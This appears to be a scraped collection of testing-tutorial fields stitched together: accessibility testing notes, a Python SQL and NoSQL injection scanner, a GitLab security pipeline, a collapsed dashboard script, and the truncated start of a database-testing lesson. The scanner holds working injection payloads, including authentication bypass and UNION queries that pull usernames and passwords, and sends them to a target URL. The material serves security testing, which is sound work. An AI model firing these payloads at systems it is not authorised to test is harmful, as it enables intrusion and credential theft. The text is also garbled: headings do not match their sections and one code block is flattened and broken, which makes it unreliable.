tutorials.title: Accessibility Testing Automation: Engineering Inclusive Digital Experiences
tutorials.description: Master comprehensive accessibility testing automation to ensure digital products are inclusive, compliant, and usable by everyone. Learn to engineer automated accessibility testing frameworks, integrate WCAG compliance into CI/CD pipelines, and build scalable accessibility validation systems.

content.title: Accessibility Engineering
content.content: Accessibility engineering is the systematic application of engineering principles to create digital experiences that are usable by people with diverse abilities, ensuring compliance with accessibility standards while maintaining technical excellence and user experience quality.
keyPoints: Accessibility is a fundamental quality attribute, not an afterthought
Engineering approach transforms compliance into continuous quality assurance
Automation enables scalable accessibility testing across development lifecycle
Accessibility engineering integrates technical, UX, and compliance perspectives
Inclusive design benefits all users, not just those with disabilities
content.details: Modern accessibility engineering combines automated testing, manual validation, and user testing to create comprehensive quality assurance processes. It moves beyond checklist compliance to create engineering systems that prevent accessibility issues, detect regressions early, and ensure continuous improvement of digital accessibility.

Phase 2: Framework Development (6-8 weeks) - Build accessibility testing framework, develop custom rules and assertions, create reporting systems, establish integration points

Keyboard navigation testing, focus management validation, timing analysis, navigation consistency

Readable text, predictable behavior, input assistance, error identification

items.definition: Using HTML elements according to their intended purpose (e.g., <nav> for navigation, <main> for main content) to provide structural meaning that assistive technologies can interpret.
Set of attributes that define ways to make web content and applications more accessible to people with disabilities, particularly for dynamic content and advanced user interface controls.
Systematic control of keyboard focus movement through interactive elements, ensuring logical navigation order and visible focus indicators.
Difference in light between foreground (text) and background colors, measured as a ratio from 1:1 (no contrast) to 21:1 (maximum contrast). WCAG requires minimum 4.5:1 for normal text.
Ensuring content is properly announced by screen readers through proper semantic structure, ARIA attributes, and logical reading order.
Ability to perform all functionality using only a keyboard, without requiring mouse interactions or specific timing.
Textual descriptions of non-text content (images, charts, icons) that convey the same information or function as the visual content.
Text alternatives for time-based media including captions for audio, audio descriptions for video, and sign language interpretation.

examples.title: Advanced SQL Injection & NoSQL Testing
examples.code:
#!/usr/bin/env python3
"""
Advanced SQL Injection and NoSQL Injection Testing Framework
"""

import requests
import json
import re
from typing import List, Dict, Any
from dataclasses import dataclass
from enum import Enum

class Severity(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"

@dataclass
class SecurityVulnerability:
    vulnerability_type: str
    endpoint: str
    payload: str
    severity: Severity
    description: str
    remediation: str
    cwe_id: str
    owasp_category: str
    evidence: str = ""
    
class AdvancedSQLInjectionTester:
    """Advanced SQL and NoSQL injection testing framework"""
    
    def __init__(self, base_url: str, session: requests.Session = None):
        self.base_url = base_url
        self.session = session or requests.Session()
        self.vulnerabilities = []
        
        # Comprehensive payload library
        self.sql_payloads = {
            'boolean_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 'a'='a",
                "' OR 'x'='x';--",
                "' OR 1=1#",
                "' OR '1'='1'--",
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:10'--",
                "'; SELECT pg_sleep(10)--",
                "'; SELECT SLEEP(10)--",
                "'; BENCHMARK(10000000,MD5('A'))--",
            ],
            'error_based': [
                "' AND 1=CONVERT(int, @@version)--",
                "' AND 1=1 UNION SELECT @@version--",
                "' AND EXTRACTVALUE(1, CONCAT(0x5c, @@version))--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT username, password FROM users--",
                "' UNION SELECT table_name FROM information_schema.tables--",
            ],
            'blind': [
                "' AND SUBSTRING(@@version,1,1)='5'",
                "' AND ASCII(SUBSTRING(@@version,1,1))=53",
                "' AND (SELECT COUNT(*) FROM users) > 0",
            ]
        }
        
        self.nosql_payloads = {
            'mongo_injection': [
                "{'$ne': 1}",
                "{'$gt': ''}",
                "{'$regex': '.*'}",
                "{'$where': '1==1'}",
                "{'$function': 'function() { return true; }'}",
            ],
            'json_injection': [
                "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
                "{\"username\": {\"$regex\": \".*\"}}",
                "{\"$where\": \"return true\"}",
            ]
        }
        
        # Database error patterns
        self.db_error_patterns = {
            'mysql': [
                r'MySQL server version',
                r'You have an error in your SQL syntax',
                r'mysql_fetch_array',
                r'mysqli',
                r'SQLSTATE',
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'pg_.*error',
                r'PSQLException',
                r'org.postgresql',
            ],
            'mssql': [
                r'Microsoft SQL Server',
                r'System.Data.SqlClient',
                r'Unclosed quotation mark',
                r'Incorrect syntax near',
            ],
            'oracle': [
                r'ORA-\d{5}',
                r'Oracle error',
                r'Oracle.*Driver',
                r'SQL command not properly ended',
            ],
            'mongodb': [
                r'MongoError',
                r'MongoDB.*error',
                r'Can\'t canonicalize query',
                r'BadValue',
            ]
        }
    
    def test_sql_injection(self, endpoint: str, method: str = "POST", 
                          params: Dict[str, Any] = None) -> List[SecurityVulnerability]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        test_params = params or {}
        
        for category, payloads in self.sql_payloads.items():
            for payload in payloads:
                # Test each parameter with payload
                for param_name, param_value in test_params.items():
                    if isinstance(param_value, str):
                        modified_params = test_params.copy()
                        modified_params[param_name] = payload
                        
                        try:
                            if method.upper() == "POST":
                                response = self.session.post(
                                    f"{self.base_url}{endpoint}",
                                    data=modified_params,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    f"{self.base_url}{endpoint}",
                                    params=modified_params,
                                    timeout=15
                                )
                            
                            # Analyze response for vulnerabilities
                            vuln = self._analyze_sql_response(
                                response, endpoint, payload, category
                            )
                            if vuln:
                                vulnerabilities.append(vuln)
                                
                        except requests.exceptions.Timeout:
                            # Potential time-based SQL injection
                            if "time_based" in category:
                                vulnerabilities.append(
                                    SecurityVulnerability(
                                        vulnerability_type="SQL Injection (Time-based)",
                                        endpoint=endpoint,
                                        payload=payload,
                                        severity=Severity.HIGH,
                                        description="Potential time-based SQL injection vulnerability detected",
                                        remediation="Use parameterized queries or prepared statements",
                                        cwe_id="CWE-89",
                                        owasp_category="A03:2021-Injection",
                                        evidence=f"Request timeout with payload: {payload}"
                                    )
                                )
                        except Exception as e:
                            print(f"Error testing {endpoint}: {e}")
        
        return vulnerabilities
    
    def test_nosql_injection(self, endpoint: str, method: str = "POST",
                            json_payload: Dict[str, Any] = None) -> List[SecurityVulnerability]:
        """Test for NoSQL injection vulnerabilities"""
        vulnerabilities = []
        
        base_payload = json_payload or {}
        
        for category, payloads in self.nosql_payloads.items():
            for payload_str in payloads:
                try:
                    # Parse payload as JSON
                    payload = json.loads(payload_str.replace("'", '"'))
                    
                    # Merge with base payload
                    test_payload = self._deep_merge(base_payload, payload)
                    
                    response = self.session.request(
                        method=method,
                        url=f"{self.base_url}{endpoint}",
                        json=test_payload,
                        timeout=10
                    )
                    
                    # Check for NoSQL injection indicators
                    if self._is_nosql_vulnerable(response, payload_str):
                        vulnerabilities.append(
                            SecurityVulnerability(
                                vulnerability_type="NoSQL Injection",
                                endpoint=endpoint,
                                payload=payload_str,
                                severity=Severity.HIGH,
                                description="NoSQL injection vulnerability detected",
                                remediation="Implement proper input validation and use parameterized queries",
                                cwe_id="CWE-943",
                                owasp_category="A03:2021-Injection",
                                evidence=f"Unauthorized access or data leakage with payload: {payload_str}"
                            )
                        )
                        
                except json.JSONDecodeError:
                    # Test as raw string injection
                    response = self.session.request(
                        method=method,
                        url=f"{self.base_url}{endpoint}",
                        data=payload_str,
                        timeout=10
                    )
                    
                    if self._is_nosql_vulnerable(response, payload_str):
                        vulnerabilities.append(
                            SecurityVulnerability(
                                vulnerability_type="NoSQL Injection",
                                endpoint=endpoint,
                                payload=payload_str,
                                severity=Severity.HIGH,
                                description="NoSQL injection vulnerability detected",
                                remediation="Implement proper input validation and use parameterized queries",
                                cwe_id="CWE-943",
                                owasp_category="A03:2021-Injection",
                                evidence=f"Unauthorized access or data leakage with payload: {payload_str}"
                            )
                        )
                
        return vulnerabilities
    
    def _analyze_sql_response(self, response, endpoint, payload, category) -> SecurityVulnerability:
        """Analyze response for SQL injection indicators"""
        content = response.text.lower()
        
        # Check for successful bypass
        bypass_indicators = [
            'welcome', 'dashboard', 'logged in', 'success',
            'profile', 'account', 'admin', 'logout'
        ]
        
        if any(indicator in content for indicator in bypass_indicators):
            return SecurityVulnerability(
                vulnerability_type=f"SQL Injection ({category})",
                endpoint=endpoint,
                payload=payload,
                severity=Severity.CRITICAL,
                description="SQL injection vulnerability allowing authentication bypass",
                remediation="Use parameterized queries, prepared statements, and stored procedures",
                cwe_id="CWE-89",
                owasp_category="A03:2021-Injection",
                evidence=f"Authentication bypass with payload: {payload}"
            )
        
        # Check for database error messages
        for db_type, patterns in self.db_error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return SecurityVulnerability(
                        vulnerability_type="Information Disclosure",
                        endpoint=endpoint,
                        payload=payload,
                        severity=Severity.MEDIUM,
                        description=f"Database error message disclosure ({db_type})",
                        remediation="Configure proper error handling to avoid information leakage",
                        cwe_id="CWE-209",
                        owasp_category="A09:2021-Security Logging and Monitoring Failures",
                        evidence=f"{db_type} error disclosed: {response.text[:200]}"
                    )
        
        # Check for differential responses
        baseline_len = len(self._get_baseline_response(endpoint))
        if abs(len(response.text) - baseline_len) > 1000:
            return SecurityVulnerability(
                vulnerability_type="Potential Blind SQL Injection",
                endpoint=endpoint,
                payload=payload,
                severity=Severity.HIGH,
                description="Potential blind SQL injection based on response differences",
                remediation="Implement proper input validation and use parameterized queries",
                cwe_id="CWE-89",
                owasp_category="A03:2021-Injection",
                evidence=f"Significant response length difference with payload: {payload}"
            )
        
        return None
    
    def _is_nosql_vulnerable(self, response, payload) -> bool:
        """Check if response indicates NoSQL injection vulnerability"""
        # Check for unauthorized data access
        success_indicators = [
            'password', 'email', 'ssn', 'credit_card',
            'token', 'secret', 'private', 'confidential'
        ]
        
        content = response.text.lower()
        if any(indicator in content for indicator in success_indicators):
            return True
        
        # Check for different response patterns
        if response.status_code == 200 and 'error' not in content:
            return True
            
        return False
    
    def _deep_merge(self, dict1, dict2):
        """Deep merge two dictionaries"""
        result = dict1.copy()
        for key, value in dict2.items():
            if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                result[key] = self._deep_merge(result[key], value)
            else:
                result[key] = value
        return result
    
    def _get_baseline_response(self, endpoint):
        """Get baseline response for comparison"""
        try:
            response = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
            return response.text
        except:
            return ""

# Usage example
if __name__ == "__main__":
    tester = AdvancedSQLInjectionTester("https://example.com")
    
    # Test login endpoint for SQL injection
    sql_vulns = tester.test_sql_injection(
        endpoint="/login",
        method="POST",
        params={"username": "test", "password": "test"}
    )
    
    # Test API endpoint for NoSQL injection
    nosql_vulns = tester.test_nosql_injection(
        endpoint="/api/users",

    )
    
    # Print results
    print(f"Found {len(sql_vulns)} SQL injection vulnerabilities")
    for vuln in sql_vulns:
        print(f"  - {vuln.vulnerability_type}: {vuln.severity.value}")
        
    print(f"Found {len(nosql_vulns)} NoSQL injection vulnerabilities")
    for vuln in nosql_vulns:
        print(f"  - {vuln.vulnerability_type}: {vuln.severity.value}")

examples.title: Enterprise GitLab CI/CD Security Pipeline
examples.code:
# .gitlab-ci.yml - Comprehensive Security Pipeline
stages:
  - security-sast
  - security-dast
  - security-sca
  - security-container
  - security-infrastructure
  - security-secrets
  - compliance
  - report

# SAST Scanning
sast-sonarqube:
  stage: security-sast
  image: sonarsource/sonar-scanner-cli:latest
  script:
    - sonar-scanner
      -Dsonar.projectKey=$CI_PROJECT_NAME
      -Dsonar.sources=.
      -Dsonar.host.url=$SONAR_HOST_URL
      -Dsonar.login=$SONAR_TOKEN
      -Dsonar.exclusions=**/*.test.js,**/node_modules/**,**/*.min.js
  artifacts:
    reports:
      sast: gl-sast-report.json
    paths:
      - .scannerwork/
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == "main"

# DAST Scanning with OWASP ZAP
dast-zap:
  stage: security-dast
  image: owasp/zap2docker-stable
  variables:
    ZAP_URL: "https://${CI_ENVIRONMENT_SLUG}.example.com"
  script:
    - zap-baseline.py -t ${ZAP_URL} -g gen.conf -r zap-report.html
    - zap-full-scan.py -t ${ZAP_URL} -g gen.conf -r zap-full-report.html
  artifacts:
    reports:
      dast: zap-report.html
    paths:
      - zap-report.html
      - zap-full-report.html
  only:
    - main
    - production

# Dependency Scanning
dependency-scanning:
  stage: security-sca
  image: registry.gitlab.com/gitlab-org/security-products/dependency-scanning:latest
  variables:
    DS_EXCLUDED_PATHS: "spec, test, tests, tmp"
  script:
    - /analyzer run
  artifacts:
    reports:
      dependency_scanning: gl-dependency-scanning-report.json
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"

# Container Security Scanning
container-scanning:
  stage: security-container
  image: aquasec/trivy:latest
  variables:
    DOCKER_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  script:
    # Build and push Docker image
    - docker build -t $DOCKER_IMAGE .
    - docker push $DOCKER_IMAGE
    
    # Scan image with Trivy
    - trivy image --severity HIGH,CRITICAL --exit-code 1 $DOCKER_IMAGE
    - trivy image --format template --template "@html.tpl" -o trivy-report.html $DOCKER_IMAGE
    
  artifacts:
    reports:
      container_scanning: trivy-report.json
    paths:
      - trivy-report.html
  only:
    - main
    - tags

# Infrastructure as Code Security
infrastructure-security:
  stage: security-infrastructure
  image: bridgecrew/checkov:latest
  script:
    # Scan Terraform files
    - checkov -d . --framework terraform --output sarif --output-file checkov-report.sarif
    
    # Scan Kubernetes manifests
    - checkov -d . --framework kubernetes --output sarif --output-file checkov-k8s-report.sarif
    
    # Scan CloudFormation
    - checkov -d . --framework cloudformation --output sarif --output-file checkov-cf-report.sarif
  artifacts:
    reports:
      sast: checkov-report.sarif
    paths:
      - checkov-*.sarif

# Secrets Detection
secrets-detection:
  stage: security-secrets
  image: ghcr.io/gitleaks/gitleaks:latest
  script:
    - gitleaks detect --source . --report-format json --report-path gitleaks-report.json
    - gitleaks detect --source . --report-format sarif --report-path gitleaks-report.sarif
  artifacts:
    reports:
      secret_detection: gitleaks-report.json
    paths:
      - gitleaks-report.sarif
  rules:
    - if: $CI_PIPELINE_SOURCE == "push"

# Compliance Scanning
compliance-check:
  stage: compliance
  image: alpine:latest
  script:
    - apk add --no-cache curl jq
    - |
      # Check compliance against policies
      ./scripts/compliance-check.sh
      
      # Generate compliance report
      ./scripts/generate-compliance-report.py
      
  artifacts:
    paths:
      - compliance-report.html
      - compliance-results.json

# Security Report Generation
security-report:
  stage: report
  image: python:3.9-slim
  script:
    - pip install pandas matplotlib jinja2
    - python scripts/generate-security-dashboard.py
  artifacts:
    paths:
      - security-dashboard.html
      - security-metrics.json
    expire_in: 30 days
  only:
    - main

# Security Gates
security-gates:
  stage: .pre
  script:
    - |
      # Fail pipeline on critical vulnerabilities
      if [[ -f "gl-sast-report.json" ]]; then
        CRITICAL_COUNT=$(jq '.vulnerabilities[] | select(.severity == "CRITICAL") | .severity' gl-sast-report.json | wc -l)
        if [[ $CRITICAL_COUNT -gt 0 ]]; then
          echo "Critical vulnerabilities found. Failing pipeline."
          exit 1
        fi
      fi
      
      # Check for high severity vulnerabilities
      if [[ -f "gl-dependency-scanning-report.json" ]]; then
        HIGH_COUNT=$(jq '.vulnerabilities[] | select(.severity == "HIGH") | .severity' gl-dependency-scanning-report.json | wc -l)
        if [[ $HIGH_COUNT -gt 5 ]]; then
          echo "Too many high severity vulnerabilities. Failing pipeline."
          exit 1
        fi
      fi
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      allow_failure: false

# Auto-remediation for low-risk issues
auto-remediation:
  stage: .post
  script:
    - |
      # Auto-update dependencies with known vulnerabilities
      if [[ -f "gl-dependency-scanning-report.json" ]]; then
        python scripts/auto-update-dependencies.py
      fi
      
      # Auto-create Jira tickets for high/critical issues
      python scripts/create-security-tickets.py
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: on_success

#!/usr/bin/env python3 """ Unified Security Dashboard Generator Aggregates results from multiple security tools into a single dashboard """ import json import pandas as pd import matplotlib.pyplot as plt from datetime import datetime from dataclasses import dataclass from typing import List, Dict, Any from pathlib import Path @dataclass class SecurityFinding: tool: str category: str severity: str title: str description: str file_path: str line_number: int cwe_id: str cvss_score: float remediation: str timestamp: datetime class UnifiedSecurityDashboard: def __init__(self, project_name: str): self.project_name = project_name self.findings = [] self.metrics = { 'total_findings': 0, 'by_severity': {}, 'by_category': {}, 'by_tool': {}, 'trend_data': [], 'compliance_status': {} } def load_sast_results(self, file_path: str, tool_name: str): """Load SAST results from various tools""" with open(file_path, 'r') as f: data = json.load(f) # Handle different SAST tool formats if tool_name == 'sonarqube': self._parse_sonarqube(data, tool_name) elif tool_name == 'checkmarx': self._parse_checkmarx(data, tool_name) elif tool_name == 'snyk_code': self._parse_snyk_code(data, tool_name) def load_dast_results(self, file_path: str, tool_name: str): """Load DAST results""" with open(file_path, 'r') as f: data = json.load(f) if tool_name == 'zap': self._parse_zap(data, tool_name) elif tool_name == 'burp': self._parse_burp(data, tool_name) def load_sca_results(self, file_path: str, tool_name: str): """Load SCA results""" with open(file_path, 'r') as f: data = json.load(f) if tool_name == 'dependency_track': self._parse_dependency_track(data, tool_name) elif tool_name == 'snyk_opensource': self._parse_snyk_opensource(data, tool_name) def load_container_results(self, file_path: str, tool_name: str): """Load container scanning results""" with open(file_path, 'r') as f: data = json.load(f) if tool_name == 'trivy': self._parse_trivy(data, tool_name) elif tool_name == 'anchore': self._parse_anchore(data, tool_name) def _parse_sonarqube(self, data: Dict, tool_name: str): """Parse SonarQube JSON report""" if 'issues' in data: for issue in data['issues']: finding = SecurityFinding( tool=tool_name, category=issue.get('type', 'CODE_SMELL'), severity=issue.get('severity', 'MAJOR'), title=issue.get('message', 'No title'), description=issue.get('message', ''), file_path=issue.get('component', '').split(':')[-1], line_number=issue.get('line', 0), cwe_id=issue.get('cwe', ''), cvss_score=self._severity_to_score(issue.get('severity')), remediation=issue.get('debt', ''), timestamp=datetime.now() ) self.findings.append(finding) def _parse_zap(self, data: Dict, tool_name: str): """Parse OWASP ZAP JSON report""" if 'site' in data: for site in data['site']: for alert in site.get('alerts', []): finding = SecurityFinding( tool=tool_name, category='DAST', severity=alert.get('risk', 'Medium'), title=alert.get('name', 'No title'), description=alert.get('desc', ''), file_path=alert.get('uri', ''), line_number=0, cwe_id=alert.get('cweid', ''), cvss_score=self._risk_to_score(alert.get('risk')), remediation=alert.get('solution', ''), timestamp=datetime.now() ) self.findings.append(finding) def _parse_dependency_track(self, data: Dict, tool_name: str): """Parse Dependency Track findings""" for component in data.get('components', []): for vuln in component.get('vulnerabilities', []): finding = SecurityFinding( tool=tool_name, category='DEPENDENCY', severity=vuln.get('severity', 'Medium'), title=vuln.get('title', 'Vulnerable Dependency'), description=vuln.get('description', ''), file_path=f"{component.get('name')}@{component.get('version')}", line_number=0, cwe_id=vuln.get('cwe', ''), cvss_score=float(vuln.get('cvssv3_baseScore', 0)), remediation=f"Update {component.get('name')} to patched version", timestamp=datetime.now() ) self.findings.append(finding) def _parse_trivy(self, data: Dict, tool_name: str): """Parse Trivy container scan results""" for result in data.get('Results', []): for vuln in result.get('Vulnerabilities', []): finding = SecurityFinding( tool=tool_name, category='CONTAINER', severity=vuln.get('Severity', 'Medium'), title=vuln.get('Title', 'Container Vulnerability'), description=vuln.get('Description', ''), file_path=f"{result.get('Target')}:{vuln.get('PkgName', '')}", line_number=0, cwe_id=vuln.get('CweIDs', [''])[0], cvss_score=float(vuln.get('CVSS', {}).get('nvd', {}).get('V3Score', 0)), remediation=vuln.get('FixedVersion', 'Update package'), timestamp=datetime.now() ) self.findings.append(finding) def _severity_to_score(self, severity: str) -> float: """Convert severity to CVSS score""" mapping = { 'BLOCKER': 9.0, 'CRITICAL': 9.0, 'MAJOR': 7.0, 'MINOR': 4.0, 'INFO': 0.0 } return mapping.get(severity.upper(), 5.0) def _risk_to_score(self, risk: str) -> float: """Convert risk to CVSS score""" mapping = { 'High': 8.0, 'Medium': 5.0, 'Low': 2.0, 'Informational': 0.0 } return mapping.get(risk, 5.0) def calculate_metrics(self): """Calculate security metrics from findings""" self.metrics['total_findings'] = len(self.findings) # Group by severity severity_counts = {} for finding in self.findings: severity = finding.severity severity_counts[severity] = severity_counts.get(severity, 0) + 1 self.metrics['by_severity'] = severity_counts # Group by category category_counts = {} for finding in self.findings: category = finding.category category_counts[category] = category_counts.get(category, 0) + 1 self.metrics['by_category'] = category_counts # Group by tool tool_counts = {} for finding in self.findings: tool = finding.tool tool_counts[tool] = tool_counts.get(tool, 0) + 1 self.metrics['by_tool'] = tool_counts # Calculate risk score total_score = sum(finding.cvss_score for finding in self.findings) self.metrics['risk_score'] = total_score / len(self.findings) if self.findings else 0 # Compliance status self.metrics['compliance_status'] = { 'owasp_top_10': self.check_owasp_compliance(), 'pci_dss': self.check_pci_compliance(), 'hipaa': self.check_hipaa_compliance(), 'gdpr': self.check_gdpr_compliance() } def check_owasp_compliance(self) -> Dict: """Check compliance with OWASP Top 10""" owasp_categories = { 'A01:2021-Broken Access Control': 0, 'A02:2021-Cryptographic Failures': 0, 'A03:2021-Injection': 0, 'A04:2021-Insecure Design': 0, 'A05:2021-Security Misconfiguration': 0, 'A06:2021-Vulnerable Components': 0, 'A07:2021-Identification Failures': 0, 'A08:2021-Software Integrity Failures': 0, 'A09:2021-Security Monitoring Failures': 0, 'A10:2021-Server-Side Request Forgery': 0 } # Map findings to OWASP categories for finding in self.findings: if 'sql' in finding.title.lower() or 'injection' in finding.title.lower(): owasp_categories['A03:2021-Injection'] += 1 elif 'xss' in finding.title.lower(): owasp_categories['A03:2021-Injection'] += 1 elif 'dependency' in finding.category.lower(): owasp_categories['A06:2021-Vulnerable Components'] += 1 # Add more mapping logic return owasp_categories def check_pci_compliance(self) -> Dict: """Check PCI DSS compliance""" pci_requirements = { 'req_1': 'Install and maintain network security controls', 'req_2': 'Apply secure configurations', 'req_3': 'Protect stored account data', 'req_4': 'Protect cardholder data in transmission', 'req_5': 'Protect systems against malware', 'req_6': 'Develop secure systems and applications', 'req_7': 'Restrict access to cardholder data', 'req_8': 'Identify users and authenticate access', 'req_9': 'Restrict physical access to cardholder data', 'req_10': 'Log and monitor access', 'req_11': 'Test security systems regularly', 'req_12': 'Support information security policy' } # Simplified compliance check compliance = {} for req, desc in pci_requirements.items(): # Check if findings violate this requirement violations = 0 for finding in self.findings: if self._violates_pci_requirement(finding, req): violations += 1 compliance[req] = { 'description': desc, 'violations': violations, 'compliant': violations == 0 } return compliance def _violates_pci_requirement(self, finding: SecurityFinding, requirement: str) -> bool: """Check if a finding violates PCI requirement""" # Simplified logic - would be more complex in reality if requirement == 'req_6': # Secure development return finding.category in ['SAST', 'DAST', 'SCA'] elif requirement == 'req_8': # Authentication return 'auth' in finding.title.lower() or 'session' in finding.title.lower() elif requirement == 'req_10': # Logging return 'log' in finding.title.lower() or 'audit' in finding.title.lower() return False def check_hipaa_compliance(self) -> Dict: """Check HIPAA compliance""" return {'status': 'To be implemented', 'violations': []} def check_gdpr_compliance(self) -> Dict: """Check GDPR compliance""" return {'status': 'To be implemented', 'violations': []} def generate_dashboard(self, output_dir: str = 'reports'): """Generate HTML dashboard""" self.calculate_metrics() # Create output directory Path(output_dir).mkdir(exist_ok=True) # Generate HTML dashboard html = self._generate_html_dashboard() with open(f'{output_dir}/security-dashboard.html', 'w') as f: f.write(html) # Generate JSON report json_report = self._generate_json_report() with open(f'{output_dir}/security-report.json', 'w') as f: json.dump(json_report, f, indent=2, default=str) # Generate charts self._generate_charts(output_dir) print(f"Dashboard generated in {output_dir}/") def _generate_html_dashboard(self) -> str: """Generate HTML dashboard""" return f""" Security Dashboard - {self.project_name}

Security Dashboard - {self.project_name}

Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Summary

Total Findings: {self.metrics['total_findings']}

Risk Score: {self.metrics.get('risk_score', 0):.2f}/10

Findings by Severity

Findings by Category

Findings by Tool

Detailed Findings

{"\n".join([f""" """ for f in sorted(self.findings, key=lambda x: x.cvss_score, reverse=True)[:50]])}
Tool Severity Title Category CVSS
{f.tool} {f.severity} {f.title} {f.category} {f.cvss_score:.1f}
""" def _generate_json_report(self) -> Dict: """Generate JSON report""" return { 'project': self.project_name, 'timestamp': datetime.now().isoformat(), 'metrics': self.metrics, 'findings': [ { 'tool': f.tool, 'severity': f.severity, 'title': f.title, 'category': f.category, 'cvss_score': f.cvss_score, 'file_path': f.file_path, 'remediation': f.remediation } for f in self.findings ] } def _generate_charts(self, output_dir: str): """Generate chart images""" # Severity distribution plt.figure(figsize=(10, 6)) plt.pie( self.metrics['by_severity'].values(), labels=self.metrics['by_severity'].keys(), autopct='%1.1f%%', colors=['#d32f2f', '#f57c00', '#fbc02d', '#388e3c'] ) plt.title('Findings by Severity') plt.savefig(f'{output_dir}/severity_distribution.png') plt.close() # Category distribution plt.figure(figsize=(12, 6)) plt.bar( self.metrics['by_category'].keys(), self.metrics['by_category'].values() ) plt.title('Findings by Category') plt.xticks(rotation=45, ha='right') plt.tight_layout() plt.savefig(f'{output_dir}/category_distribution.png') plt.close() # Usage example if __name__ == "__main__": dashboard = UnifiedSecurityDashboard("My Application") # Load results from various security tools dashboard.load_sast_results("reports/sonarqube-report.json", "sonarqube") dashboard.load_dast_results("reports/zap-report.json", "zap") dashboard.load_sca_results("reports/dependency-track-report.json", "dependency_track") dashboard.load_container_results("reports/trivy-report.json", "trivy") # Generate dashboard dashboard.generate_dashboard() print("Security dashboard generated successfully!") print(f"Total findings: {dashboard.metrics['total_findings']}") print(f"Critical findings: {dashboard.metrics['by_severity'].get('CRITICAL', 0)}")

tutorials.title: Database Testing Automation
tutorials.description: Learn to automate database testing for data integrity, performance, and security. Practical examples for SQL and NoSQL databases.
learningObjectives: Write automated database structure tests
Test CRUD operations and data integrity
Manage test data effectively
Integrate database tests in CI/CD
Test stored procedures and triggers
Implement performance testing strategies
Apply testing patterns for different database types
Monitor and maintain test suite health
prerequisites: Understanding of database concepts (tables, constraints, transactions)
Experience with a programming language (Python, Java, or similar)

content.title: What is Database Testing?
content.value:
Database testing goes beyond UI testing to validate the data layer directly. It's crucial for ensuring **data integrity, accuracy, consistency, security, and performance**. The shift-left approach integrates database tests early in the CI/CD pipeline, catching issues before they reach production.

### Key Objectives:
- **Data Integrity**: Ensuring data relationships and constraints work correctly
- **Accuracy**: Verifying data correctness and business logic
- **Consistency**: Maintaining data coherence across the system
- **Security**: Protecting sensitive data and preventing vulnerabilities
- **Performance**: Ensuring optimal query execution and response times

content.title: Why Automate Database Testing?
content.value:
**Manual testing challenges**: Time-consuming, error-prone, and difficult to scale with frequent releases.

**Automation benefits**:
- **Speed**: Run tests quickly and consistently
- **Repeatability**: Ensure identical test conditions every time
- **Early Detection**: Catch issues in development/CI pipelines
- **DevOps Support**: Enable continuous testing and deployment
- **Scalability**: Test complex scenarios that are impractical manually

content.title: Scope & Types of Database Tests
content.value:
### Structural Testing
Validating schema elements: tables, columns, keys, indexes, triggers, stored procedures.

### Functional/Data Testing
- Data mapping between UI and database
- CRUD operation validation
- Stored procedure and function testing
- Trigger execution and side-effects

### Data Integrity & Consistency Testing
- Referential integrity (foreign keys)
- Null and check constraints
- Business rule enforcement

### Migration Testing
- Schema changes validation
- ETL/ELT process verification
- Data seeding and transformation

### Performance & Load Testing
- Query optimization analysis
- Index efficiency evaluation
- Deadlock detection
- Connection pooling validation

### Security Testing
- SQL injection prevention
- Access control verification
- Data encryption validation
- Audit log monitoring

content.title: Test Data Management (The Cornerstone)
content.value:
### The Challenge
Reliable, isolated, and consistent test data is essential for effective database testing.

### Strategies
1. **Fresh Fixtures**: Small, specific datasets created per test
2. **Subset Cloning**: Creating manageable copies of production data (masked/anonymized)
3. **Synthetic Data Generation**: Using tools like Faker, Mockaroo for realistic test data
4. **Data Masking/Obscuring**: For PII/PCI compliance (e.g., GDPR)

### Lifecycle Management
- **Creation**: Generate appropriate test data
- **Maintenance**: Keep test data relevant and up-to-date
- **Cleanup**: Use @Before/@After hooks, transactions for isolation

content.title: The Automation Environment
content.value:
### Isolated Test Database
Never test on production! Use containers (Docker) for spin-up/down of test databases.

### Version Control for DB Artifacts
- Schema scripts (Liquibase, Flyway)
- Seed data scripts
- Test configurations and scripts

### Environment Consistency
Ensure development, QA, and staging databases are aligned to prevent environment-specific issues.

content.title: Understanding Structure Testing
content.value:
Structure testing validates the database schema - the foundation upon which your data sits. It ensures that tables, columns, constraints, and indexes exist and are correctly configured before any data operations occur.

### Why Structure Testing Matters:
1. **Catch Schema Drift**: Detect unauthorized or accidental schema changes
2. **Validate Migrations**: Ensure database changes are applied correctly
3. **Prevent Runtime Errors**: Identify missing constraints or indexes before they cause issues
4. **Documentation**: Serve as living documentation of your database schema

examples.title: Check Table Structure
examples.code:
-- Check if table exists
SELECT COUNT(*) FROM information_schema.tables 
WHERE table_name = 'users';

-- Check columns in table
SELECT column_name, data_type, is_nullable
FROM information_schema.columns 
WHERE table_name = 'users' 
ORDER BY ordinal_position;

-- Check primary key
SELECT constraint_name, constraint_type
FROM information_schema.table_constraints
WHERE table_name = 'users' 
  AND constraint_type = 'PRIMARY KEY';

-- Check foreign keys
SELECT tc.constraint_name, 
       kcu.column_name, 
       ccu.table_name AS foreign_table_name
FROM information_schema.table_constraints tc
JOIN information_schema.key_column_usage kcu 
  ON tc.constraint_name = kcu.constraint_name
JOIN information_schema.constraint_column_usage ccu 
  ON ccu.constraint_name = tc.constraint_name
WHERE tc.table_name = 'orders' 
  AND tc.constraint_type = 'FOREIGN KEY';

examples.code:
import pytest
import psycopg2

